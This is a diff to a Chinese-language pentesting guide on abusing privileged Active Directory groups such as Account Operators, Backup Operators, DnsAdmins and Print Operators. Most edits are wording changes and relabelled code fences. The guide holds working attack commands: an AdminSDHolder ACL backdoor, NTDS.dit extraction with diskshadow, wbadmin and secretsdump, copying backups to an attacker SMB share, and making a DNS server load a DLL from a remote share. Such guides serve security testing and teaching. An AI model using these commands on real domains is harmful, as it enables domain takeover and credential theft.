@@ -10,10 +10,10 @@
 
 ## 账户操作员
 
-该组有权创建不是域管理员的账户和组。此外，它还允许在域控制器（DC）上进行本地登录。
+该组有权创建不是域管理员的账户和组。此外，它还允许本地登录到域控制器（DC）。
 
 要识别该组的成员，可以执行以下命令：
-```powershell
+```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
 添加新用户是被允许的，同时也可以在 DC01 上进行本地登录。
@@ -25,39 +25,39 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，向标准用户授予完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统的设计，他们将在一小时内自动恢复。
 
 查看成员和修改权限的命令包括：
-```powershell
+```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-可以使用脚本来加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。
+可以使用脚本来加快恢复过程: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。
 
 有关更多详细信息，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。
 
 ## AD 回收站
 
-加入此组可以读取已删除的 Active Directory 对象，这可能会揭示敏感信息：
+该组的成员资格允许读取已删除的 Active Directory 对象，这可能会揭示敏感信息:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 ### 域控制器访问
 
-除非用户是 `Server Operators` 组的一部分，否则对 DC 上文件的访问是受限的，这会改变访问级别。
+对 DC 上文件的访问受到限制，除非用户是 `Server Operators` 组的一部分，这会改变访问级别。
 
 ### 权限提升
 
-使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，从而允许执行任意命令和权限提升：
+使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-此命令显示 `Server Operators` 拥有完全访问权限，允许操纵服务以获取提升的权限。
+此命令显示 `Server Operators` 拥有完全访问权限，允许操纵服务以获得提升的权限。
 
-## 备份操作员
+## Backup Operators
 
-加入 `Backup Operators` 组提供对 `DC01` 文件系统的访问权限，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和文件复制成为可能，即使没有明确的权限，也可以使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
+加入 `Backup Operators` 组提供对 `DC01` 文件系统的访问权限，因其拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得即使没有明确的权限，也能进行文件夹遍历、列出和复制文件的操作，使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
 
 要列出组成员，请执行：
-```powershell
+```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 ### 本地攻击
@@ -85,7 +85,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 
 #### 使用 diskshadow.exe
 
-1. 创建 `C` 盘的影像副本：
+1. 创建 `C` 盘的影子副本：
 ```cmd
 diskshadow.exe
 set verbose on
@@ -117,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### 使用 wbadmin.exe
 
-1. 在攻击者机器上设置 NTFS 文件系统以供 SMB 服务器使用，并在目标机器上缓存 SMB 凭据。
+1. 在攻击者机器上设置 NTFS 文件系统以用于 SMB 服务器，并在目标机器上缓存 SMB 凭据。
 2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -130,16 +130,16 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 
 ## DnsAdmins
 
-**DnsAdmins** 组的成员可以利用他们的特权在 DNS 服务器上加载任意 DLL，通常托管在域控制器上，具有 SYSTEM 特权。这种能力允许显著的利用潜力。
+**DnsAdmins** 组的成员可以利用他们的特权在 DNS 服务器上加载具有 SYSTEM 权限的任意 DLL，通常托管在域控制器上。此能力允许显著的利用潜力。
 
 要列出 DnsAdmins 组的成员，请使用：
-```powershell
+```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### 执行任意 DLL
 
 成员可以使用以下命令使 DNS 服务器加载任意 DLL（无论是本地的还是来自远程共享的）：
-```powershell
+```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
@@ -175,15 +175,15 @@ DnsAdmins 可以操纵 DNS 记录，通过在禁用全局查询阻止列表后�
 
 ### 事件日志读取器
 成员可以访问事件日志，可能会找到敏感信息，例如明文密码或命令执行详细信息：
-```powershell
+```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Exchange Windows 权限
+## Exchange Windows Permissions
 
-该组可以修改域对象上的 DACL，可能授予 DCSync 权限。利用该组进行权限提升的技术详见 Exchange-AD-Privesc GitHub 仓库。
-```powershell
+该组可以修改域对象上的 DACL，可能授予 DCSync 权限。利用该组进行特权升级的技术在 Exchange-AD-Privesc GitHub 仓库中有详细说明。
+```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
@@ -203,7 +203,7 @@ sc.exe start MozillaMaintenance
 
 ## 组织管理
 
-在部署了**Microsoft Exchange**的环境中，一个特殊的组称为**组织管理**，拥有重要的能力。该组有权**访问所有域用户的邮箱**，并对“Microsoft Exchange安全组”组织单位（OU）拥有**完全控制权**。这种控制包括**`Exchange Windows Permissions`**组，可以被利用进行权限提升。
+在部署了**Microsoft Exchange**的环境中，一个特殊的组称为**组织管理**，拥有重要的能力。该组有权**访问所有域用户的邮箱**，并对“Microsoft Exchange安全组”组织单位（OU）拥有**完全控制权**。这种控制包括**`Exchange Windows Permissions`**组，该组可以被利用进行权限提升。
 
 ### 权限利用和命令
 
@@ -212,7 +212,7 @@ sc.exe start MozillaMaintenance
 **打印操作员**组的成员被赋予多个权限，包括**`SeLoadDriverPrivilege`**，允许他们**在域控制器上本地登录**、关闭它并管理打印机。为了利用这些权限，特别是当**`SeLoadDriverPrivilege`**在未提升的上下文中不可见时，必须绕过用户帐户控制（UAC）。
 
 要列出该组的成员，可以使用以下PowerShell命令：
-```powershell
+```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 有关**`SeLoadDriverPrivilege`**的更详细利用技术，应该查阅特定的安全资源。
@@ -220,16 +220,16 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 #### 远程桌面用户
 
 该组的成员通过远程桌面协议（RDP）获得对PC的访问权限。要枚举这些成员，可以使用PowerShell命令：
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-进一步了解利用 RDP 的信息可以在专门的渗透测试资源中找到。
+进一步的关于利用 RDP 的见解可以在专门的渗透测试资源中找到。
 
 #### 远程管理用户
 
 成员可以通过 **Windows 远程管理 (WinRM)** 访问 PC。通过以下方式枚举这些成员：
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
@@ -237,11 +237,11 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 
 #### 服务器操作员
 
-该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间和关闭系统。要枚举成员，可以使用以下命令：
-```powershell
+该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间以及关闭系统。要列举成员，可以使用以下命令：
+```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-## 参考文献 <a href="#references" id="references"></a>
+## References <a href="#references" id="references"></a>
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
